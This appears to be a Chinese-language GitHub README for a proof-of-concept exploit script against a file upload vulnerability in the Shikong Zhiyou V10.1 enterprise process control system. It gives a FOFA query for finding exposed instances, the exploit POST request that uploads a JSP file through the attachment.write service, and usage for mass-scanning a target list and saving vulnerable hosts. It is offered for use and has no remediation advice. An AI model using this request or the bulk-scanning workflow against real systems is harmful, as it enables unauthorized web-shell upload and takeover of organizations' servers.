时空智友系统文件上传漏洞poc.py

时空智友企业流程化管控系统存在文件上传漏洞

FOFA语句：app=“时空智友V10.1”

POC:POST /formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1

py脚本
使用：python3 poc.py -f url.txt(存放探测目标url)
存在漏洞的目标url放入result.txt文件
![image](https://github.com/1daomeidan/SKZY-upload/assets/143391153/b6a0f6a4-1e12-4f31-9640-3b7a565b06b5)
![image](https://github.com/1daomeidan/SKZY-upload/assets/143391153/ad6c9696-9cb4-4b94-915f-a4dd06d76af0)
